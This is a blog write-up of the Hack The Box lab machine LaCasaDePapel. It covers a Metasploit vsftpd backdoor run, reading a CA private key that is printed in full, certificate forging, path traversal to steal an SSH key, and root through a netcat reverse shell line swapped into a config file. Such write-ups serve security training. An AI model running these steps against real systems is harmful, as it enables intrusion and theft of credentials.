<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - LaCasaDePapel | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - LaCasaDePapel" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up for LaCasaDePapel from Hack The Box." />
<meta property="og:description" content="My write-up for LaCasaDePapel from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/lacasadepapel/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/lacasadepapel/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/lacasadepapel/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-07-27T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up for LaCasaDePapel from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/lacasadepapel/","image":"https://0xrick.github.io/hackthebox/lacasadepapel/0.png","headline":"Hack The Box - LaCasaDePapel","dateModified":"2019-07-27T00:00:00+02:00","datePublished":"2019-07-27T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/lacasadepapel/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.png" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - LaCasaDePapel</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/ssh/">ssh</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
  </div>
  
  <div class="post-date">Published on 27 Jul 2019</div>
  
  <div class="post-description">My write-up for LaCasaDePapel from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br> Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.131</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">lacasadepapel.htb</code>. Let’s jump right in !
<img src="/images/hackthebox/lacasadepapel/0.png" alt=""></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="highlighter-rouge">nmap -sV -sT -sC lacasadepapel.htb</code>
<img src="/images/hackthebox/lacasadepapel/1.png" alt="">
<br> We have <code class="highlighter-rouge">http</code> on port 80. <code class="highlighter-rouge">https</code> on port 443, <code class="highlighter-rouge">ftp</code> on port 21 and <code class="highlighter-rouge">ssh</code> on port 22.
<br> Anonymous authentication wasn’t allowed on <code class="highlighter-rouge">ftp</code> so I checked <code class="highlighter-rouge">http</code> and <code class="highlighter-rouge">https</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb
Connected to lacasadepapel.htb.
220 (vsFTPd 2.3.4)
Name (lacasadepapel.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&gt; 
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="http">HTTP</h2>
<p><code class="highlighter-rouge">http://lacasadepapel.htb</code>
<img src="/images/hackthebox/lacasadepapel/2.png" alt="">
<br> We see an image of the characters from <a href="https://www.imdb.com/title/tt6468322/" target="_blank" rel="noopener noreferrer">LaCasaDePapel</a> (TV show) and a QR code for <code class="highlighter-rouge">OTP</code>, I scanned it with <a href="https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;hl=en" target="_blank" rel="noopener noreferrer">Google Authenticator</a> on my phone :
<img src="/images/hackthebox/lacasadepapel/3.png" alt="">
<br> As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the <code class="highlighter-rouge">OTP</code> and used <code class="highlighter-rouge">test@test.com</code> as email :
<img src="/images/hackthebox/lacasadepapel/4.png" alt="">
<br> Then nothing happened, I just got the same page back again. I tried <code class="highlighter-rouge">gobuster</code> to see if I can find any sub directories and I didn’t get anything useful. Let’s check <code class="highlighter-rouge">https</code>.
<code class="highlighter-rouge">https://lacasadepapel.htb</code>
<img src="/images/hackthebox/lacasadepapel/5.png" alt="">
<br> The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.”
<br></p>
<hr>

<h2 id="vsftpd-234-psy-shell">vsftpd 2.3.4, Psy Shell</h2>
<p><br> After hitting dead ends with web, I checked the <code class="highlighter-rouge">ftp</code> service again, the version was <code class="highlighter-rouge">vsftpd 2.3.4</code> (from the <code class="highlighter-rouge">nmap</code> scan) so I searched for exploits :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                            |  Path
                                                                                                                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                    | exploits/unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
</code></pre></div></div>
<p><br> Command Execution and there is a <code class="highlighter-rouge">metasploit</code> module for it, but the exploit didn’t work :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; search vsftpd 2.3.4

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   1  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   2  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   3  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   4  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.131
rhosts =&gt; 10.10.10.131
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit 

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[+] 10.10.10.131:21 - Backdoor service has been spawned, handling...
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; 
</code></pre></div></div>
<p><br> Apparently there was another service running on port 6200, a quick <code class="highlighter-rouge">nmap</code> scan shows that the port is open :
<img src="/images/hackthebox/lacasadepapel/6.png" alt="">
<br> So I connected to that port with <code class="highlighter-rouge">nc</code> to see what’s there :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# nc lacasadepapel.htb 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
</code></pre></div></div>
<p><br> The banner says <code class="highlighter-rouge">Psy Shell v0.9.9</code>, I didn’t know what <code class="highlighter-rouge">Psy Shell</code> was but a quick search and I found the <a href="https://psysh.org/" target="_blank" rel="noopener noreferrer">website</a>. It’s a shell used for interactive <code class="highlighter-rouge">php</code> debugging and we can use it to execute <code class="highlighter-rouge">php</code>. 
<br> I tried to execute system commands but I couldn’t :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec("whoami")
PHP Fatal error:  Call to undefined function exec() in Psy Shell code on line 1
system("whoami")
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
</code></pre></div></div>
<p><br> I tried to use <code class="highlighter-rouge">scandir()</code> to see the current directory listing and it worked :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scandir(".")
=&gt; [
	 ".",
	 "..",
	 ".DS_Store",
	 "._.DS_Store",
	 "bin",
	 "boot",
	 "dev",
	 "etc",
	 "home",
	 "lib",
	 "lost+found",
	 "media",
	 "mnt",
	 "opt",
	 "proc",
	 "root",
	 "run",
	 "sbin",
	 "srv",
	 "swap",
	 "sys",
	 "tmp",
	 "usr",
	 "var",                           
   ]
</code></pre></div></div>
<p><br> I could list the directories in <code class="highlighter-rouge">/home</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scandir("home/")
=&gt; [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
</code></pre></div></div>
<p><br> Now we know the users on the box : <code class="highlighter-rouge">berlin</code>,<code class="highlighter-rouge">dali</code>,<code class="highlighter-rouge">nairobi</code>,<code class="highlighter-rouge">oslo</code> and <code class="highlighter-rouge">professor</code>.
<br> I found the user flag in <code class="highlighter-rouge">/home/berlin</code>, however I got permission denied when I tried to read it :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scandir("home/berlin")
=&gt; [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
readfile("home/berlin/user.txt")
PHP Warning:  readfile(home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1
</code></pre></div></div>
<p><br> Same for <code class="highlighter-rouge">.ssh</code>, after a lot of failed attempts to get <code class="highlighter-rouge">RCE</code>, I looked at the <code class="highlighter-rouge">help</code> menu to see if there’s anything helpful:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>help
  help       Show a list of commands. Type `help [foo]` for information about [foo].                                Aliases: ?  
  ls         List local, instance or class variables, methods and constants.                                        Aliases: list, dir
  dump       Dump an object or primitive.
  doc        Read the documentation for an object, class, constant, method or property.                             Aliases: rtfm, man  
  show       Show the code for an object, class, constant, method or property.
  wtf        Show the backtrace of the most recent exception.                                                       Aliases: last-exception, wtf?
  whereami   Show where you are in the code.
  throw-up   Throw an exception or error out of the Psy Shell.
  timeit     Profiles with a timer.
  trace      Show the current call stack.
  buffer     Show (or clear) the contents of the code input buffer.                                                 Aliases: buf
  clear      Clear the Psy Shell screen.
  edit       Open an external editor. Afterwards, get produced code in input buffer.
  sudo       Evaluate PHP code, bypassing visibility restrictions.
  history    Show the Psy Shell history.                                                                            Aliases: hist
  exit       End the current session and return to caller.                                                          Aliases: quit, q
</code></pre></div></div>
<p><br> I used <code class="highlighter-rouge">ls</code> to see what variables are there :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
Variables: $tokyo
</code></pre></div></div>
<p><br> There was only one variable called <code class="highlighter-rouge">tokyo</code> , let’s check that variable:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show $tokyo
  &gt; 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=&gt;'sha256']);
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }
</code></pre></div></div>
<p><br> The function <code class="highlighter-rouge">sign()</code> is using the private key <code class="highlighter-rouge">/home/nairobi/ca.key</code>, we can grab that key and create a client certificate to access the <code class="highlighter-rouge">https</code> service we couldn’t access before.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file_get_contents('/home/nairobi/ca.key');
=&gt; """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="client-certificate-generation">Client Certificate Generation</h2>
<p><br> First, we will create a certificate signing request (<code class="highlighter-rouge">CSR</code>) :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# cat ca.key
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl req -new -key ca.key -out server.csr                                                                                                                    
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
</code></pre></div></div>
<p><br> Then we will use it to generate the certificate :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt                                                                                      
Signature ok
subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = lacasadepapel.htb
Getting Private key
</code></pre></div></div>
<p><br> And finally we will create a <code class="highlighter-rouge">PKCS12</code> certificate :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# 
</code></pre></div></div>
<p><br> Now we can import it to Firefox :
<img src="/images/hackthebox/lacasadepapel/7.png" alt="">
<br>
<br>
<img src="/images/hackthebox/lacasadepapel/8.png" alt="">
<br>
<br>
<img src="/images/hackthebox/lacasadepapel/9.png" alt="">
<br> We have to Remove the <code class="highlighter-rouge">ssl</code> exception we gave earlier to <code class="highlighter-rouge">https://lacasadepapel.htb</code>, then we will visit it again and it will request our client certificate :
<img src="/images/hackthebox/lacasadepapel/10.png" alt="">
<br>
<br>
<img src="/images/hackthebox/lacasadepapel/11.png" alt=""></p>
<hr>

<h2 id="path-traversal-arbitrary-file-download-user-flag">Path Traversal, Arbitrary File Download, User Flag</h2>
<p><br> After gaining access we have an option to choose season 1 or season 2, clicking on one of them will take us to a page to download episodes :
<img src="/images/hackthebox/lacasadepapel/12.png" alt="">
<br> As you can see in the <code class="highlighter-rouge">url</code> there is a get parameter called <code class="highlighter-rouge">path</code>, which means that the <code class="highlighter-rouge">php</code> script reads files from a given path and lists them (in this case directory : <code class="highlighter-rouge">SEASON-1</code>). If that parameter doesn’t get filtered correctly it can cause a path traversal vulnerability allowing us to list files in other directories. However listing files doesn’t help us in any way, we already can do that with <code class="highlighter-rouge">Psy Shell</code>. But if we try to download an episode, <code class="highlighter-rouge">01.avi</code> for example :
<img src="/images/hackthebox/lacasadepapel/13.png" alt=""> 
<br> The download link will be : <code class="highlighter-rouge">https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp</code>
<br> Decoding that base-64 string we get this :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo U0VBU09OLTEvMDEuYXZp | base64 -d 
SEASON-1/01.aviroot@kali:~/Desktop/HTB/boxes/lacasadepapel# 
</code></pre></div></div>
<p><br> It uses the path to request files, let’s see where are we first :
<code class="highlighter-rouge">https://lacasadepapel/?path=../</code>
<img src="/images/hackthebox/lacasadepapel/14.png" alt="">
<br> We are in <code class="highlighter-rouge">berlin</code>’s home directory (Because the user flag is there).
<code class="highlighter-rouge">https://lacasadepapel/?path=../.ssh/</code>
<img src="/images/hackthebox/lacasadepapel/15.png" alt="">
<br> Let’s download <code class="highlighter-rouge">id_rsa</code>, we know that the path is <code class="highlighter-rouge">../.ssh/id_rsa</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../.ssh/id_rsa" | base64
Li4vLnNzaC9pZF9yc2E=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">-n</code> for no new lines.
<code class="highlighter-rouge">https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=</code>
<img src="/images/hackthebox/lacasadepapel/16.png" alt="">
<br> We found the key in <code class="highlighter-rouge">berlin</code>’s home directory, however I couldn’t get <code class="highlighter-rouge">ssh</code> as <code class="highlighter-rouge">berlin</code>, I tried other users and <code class="highlighter-rouge">professor</code> worked :
<img src="/images/hackthebox/lacasadepapel/17.png" alt="">
<br> I couldn’t read the flag as <code class="highlighter-rouge">professor</code>, so I downloaded it like I downloaded the <code class="highlighter-rouge">ssh</code> key :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../user.txt" | base64
Li4vdXNlci50eHQ=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
</code></pre></div></div>
<p><code class="highlighter-rouge">https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=</code>
<img src="/images/hackthebox/lacasadepapel/18.png" alt="">
<br>
<br>
<img src="/images/hackthebox/lacasadepapel/19.png" alt="">
<br> We owned user.</p>
<hr>

<h2 id="privilege-escalation-root-flag">Privilege Escalation, Root Flag</h2>
<p><br> In the home directory of <code class="highlighter-rouge">professor</code> there are 2 interesting files : <code class="highlighter-rouge">memcached.ini</code> and <code class="highlighter-rouge">memcached.js</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -&gt; /dev/null
drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
lacasadepapel [~]$ 
</code></pre></div></div>
<p><br> We can’t read <code class="highlighter-rouge">memcached.js</code> but we can read <code class="highlighter-rouge">memecached.ini</code>, we can’t write to both.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ cat memcached.js 
cat: can't open 'memcached.js': Permission denied
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ 
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">memcached.ini</code> is executing this command : <code class="highlighter-rouge">/usr/bin/node /home/professor/memcached.js</code> as <code class="highlighter-rouge">nobody</code> by using <code class="highlighter-rouge">sudo</code>. Most likely it will be running as root, I ran <code class="highlighter-rouge">pspy</code> and saw that the command gets executed periodically :
<img src="/images/hackthebox/lacasadepapel/20.png" alt="">
<br> The <code class="highlighter-rouge">uid</code> is 65534 which is the <code class="highlighter-rouge">uid</code> of <code class="highlighter-rouge">nobody</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ id nobody
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
lacasadepapel [~]$ 
</code></pre></div></div>
<p><br> We can’t write to <code class="highlighter-rouge">memcached.ini</code>, but we can delete it and create a new one :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ vi memcached.ini
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = /usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash
lacasadepapel [~]$
</code></pre></div></div>
<p><br> I changed the command from <code class="highlighter-rouge">sudo -u nobody /usr/bin/node /home/professor/memcached.js</code> to <code class="highlighter-rouge">/usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash</code>. After some seconds I got a reverse shell as root :
<img src="/images/hackthebox/lacasadepapel/21.png" alt="">
<br> And we owned root !
<br> That’s it , Feedback is appreciated !
